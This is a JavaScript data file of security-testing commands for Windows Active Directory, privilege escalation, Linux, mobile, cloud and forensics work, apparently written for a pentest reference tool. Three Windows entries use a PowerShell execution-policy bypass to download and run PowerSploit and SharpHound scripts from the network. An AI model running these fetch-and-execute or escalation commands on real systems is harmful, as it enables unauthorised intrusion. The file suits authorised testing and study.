// Windows-specific Commands Database
const WINDOWS_COMMANDS = {
    "Active Directory": [
        {
            "id": 1,
            "name": "PowerView Domain Enumeration",
            "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-Domain\"",
            "description": "Enumerate Active Directory domain information",
            "category": "Active Directory"
        },
        {
            "id": 2,
            "name": "Domain Controllers",
            "command": "nltest /dclist:{domain}",
            "description": "List domain controllers",
            "category": "Active Directory"
        },
        {
            "id": 3,
            "name": "Domain Trusts",
            "command": "nltest /domain_trusts",
            "description": "Enumerate domain trust relationships",
            "category": "Active Directory"
        },
        {
            "id": 4,
            "name": "BloodHound Collector",
            "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); Invoke-BloodHound\"",
            "description": "Collect BloodHound data for AD analysis",
            "category": "Active Directory"
        }
    ],
    "Privilege Escalation": [
        {
            "id": 5,
            "name": "PowerUp Privilege Check",
            "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks\"",
            "description": "Check for privilege escalation vectors",
            "category": "Privilege Escalation"
        },
        {
            "id": 6,
            "name": "UAC Bypass Check",
            "command": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            "description": "Check UAC configuration",
            "category": "Privilege Escalation"
        },
        {
            "id": 7,
            "name": "Always Install Elevated",
            "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "description": "Check for AlwaysInstallElevated registry setting",
            "category": "Privilege Escalation"
        }
    ],
    "System Information": [
        {
            "id": 8,
            "name": "System Information",
            "command": "systeminfo",
            "description": "Display system configuration information",
            "category": "Enumeration"
        },
        {
            "id": 9,
            "name": "Running Processes",
            "command": "tasklist /v",
            "description": "List running processes with details",
            "category": "Enumeration"
        },
        {
            "id": 10,
            "name": "Network Connections",
            "command": "netstat -an",
            "description": "Display network connections",
            "category": "Network"
        },
        {
            "id": 11,
            "name": "Local Users",
            "command": "net user",
            "description": "List local user accounts",
            "category": "Enumeration"
        },
        {
            "id": 12,
            "name": "Local Groups",
            "command": "net localgroup",
            "description": "List local groups",
            "category": "Enumeration"
        }
    ]
};

// Linux-specific Commands Database
const LINUX_COMMANDS = {
    "System Enumeration": [
        {
            "id": 1,
            "name": "System Information",
            "command": "uname -a",
            "description": "Display system information",
            "category": "Enumeration"
        },
        {
            "id": 2,
            "name": "OS Release Info",
            "command": "cat /etc/os-release",
            "description": "Display OS release information",
            "category": "Enumeration"
        },
        {
            "id": 3,
            "name": "Running Processes",
            "command": "ps aux",
            "description": "List running processes",
            "category": "Enumeration"
        },
        {
            "id": 4,
            "name": "Network Connections",
            "command": "netstat -tulpn",
            "description": "Display network connections",
            "category": "Network"
        },
        {
            "id": 5,
            "name": "Sudo Permissions",
            "command": "sudo -l",
            "description": "Check sudo permissions for current user",
            "category": "Privilege Escalation"
        }
    ],
    "File Operations": [
        {
            "id": 6,
            "name": "Find SUID Files",
            "command": "find / -perm -u=s -type f 2>/dev/null",
            "description": "Find files with SUID bit set",
            "category": "Privilege Escalation"
        },
        {
            "id": 7,
            "name": "Find World Writable Files",
            "command": "find / -perm -2 -type f 2>/dev/null",
            "description": "Find world-writable files",
            "category": "Privilege Escalation"
        },
        {
            "id": 8,
            "name": "Find Configuration Files",
            "command": "find /etc -name '*.conf' 2>/dev/null",
            "description": "Find configuration files",
            "category": "Enumeration"
        }
    ]
};

// Mobile Testing Commands Database
const MOBILE_COMMANDS = {
    "Android": [
        {
            "id": 1,
            "name": "ADB Connect",
            "command": "adb connect {ip}:5555",
            "description": "Connect to Android device via ADB",
            "category": "Android"
        },
        {
            "id": 2,
            "name": "List Packages",
            "command": "adb shell pm list packages",
            "description": "List installed packages",
            "category": "Android"
        },
        {
            "id": 3,
            "name": "Pull APK",
            "command": "adb shell pm path com.example.app | sed 's/package://' | xargs adb pull",
            "description": "Extract APK file from device",
            "category": "Android"
        },
        {
            "id": 4,
            "name": "Frida Server Check",
            "command": "adb shell ps | grep frida",
            "description": "Check if Frida server is running",
            "category": "Android"
        }
    ],
    "iOS": [
        {
            "id": 5,
            "name": "SSH Connect",
            "command": "ssh root@{ip}",
            "description": "SSH into jailbroken iOS device",
            "category": "iOS"
        },
        {
            "id": 6,
            "name": "List Applications",
            "command": "ls /Applications/",
            "description": "List installed applications",
            "category": "iOS"
        }
    ]
};

// Cloud Security Commands Database
const CLOUD_COMMANDS = {
    "AWS": [
        {
            "id": 1,
            "name": "AWS Profile List",
            "command": "aws configure list-profiles",
            "description": "List AWS CLI profiles",
            "category": "AWS"
        },
        {
            "id": 2,
            "name": "S3 Bucket List",
            "command": "aws s3 ls",
            "description": "List S3 buckets",
            "category": "AWS"
        },
        {
            "id": 3,
            "name": "EC2 Instances",
            "command": "aws ec2 describe-instances",
            "description": "List EC2 instances",
            "category": "AWS"
        },
        {
            "id": 4,
            "name": "IAM Users",
            "command": "aws iam list-users",
            "description": "List IAM users",
            "category": "AWS"
        }
    ],
    "Azure": [
        {
            "id": 5,
            "name": "Azure Login",
            "command": "az login",
            "description": "Login to Azure",
            "category": "Azure"
        },
        {
            "id": 6,
            "name": "Resource Groups",
            "command": "az group list",
            "description": "List resource groups",
            "category": "Azure"
        }
    ]
};

// Digital Forensics Commands Database
const FORENSICS_COMMANDS = {
    "Disk Analysis": [
        {
            "id": 1,
            "name": "Create Disk Image",
            "command": "dd if=/dev/sda of=disk_image.dd bs=1M",
            "description": "Create bit-for-bit disk image",
            "category": "Disk Imaging"
        },
        {
            "id": 2,
            "name": "Mount Disk Image",
            "command": "mount -o loop,ro disk_image.dd /mnt/evidence",
            "description": "Mount disk image read-only",
            "category": "Disk Imaging"
        },
        {
            "id": 3,
            "name": "Autopsy Analysis",
            "command": "autopsy",
            "description": "Launch Autopsy forensic browser",
            "category": "Analysis"
        },
        {
            "id": 4,
            "name": "File Carving with Foremost",
            "command": "foremost -i disk_image.dd -o carved_files/",
            "description": "Recover deleted files using foremost",
            "category": "File Recovery"
        }
    ],
    "Memory Analysis": [
        {
            "id": 5,
            "name": "Volatility Profile",
            "command": "volatility -f memory.dump imageinfo",
            "description": "Identify memory dump profile",
            "category": "Memory Analysis"
        },
        {
            "id": 6,
            "name": "Process List",
            "command": "volatility -f memory.dump --profile=Win7SP1x64 pslist",
            "description": "List running processes from memory",
            "category": "Memory Analysis"
        },
        {
            "id": 7,
            "name": "Network Connections",
            "command": "volatility -f memory.dump --profile=Win7SP1x64 netscan",
            "description": "Extract network connections from memory",
            "category": "Memory Analysis"
        }
    ]
};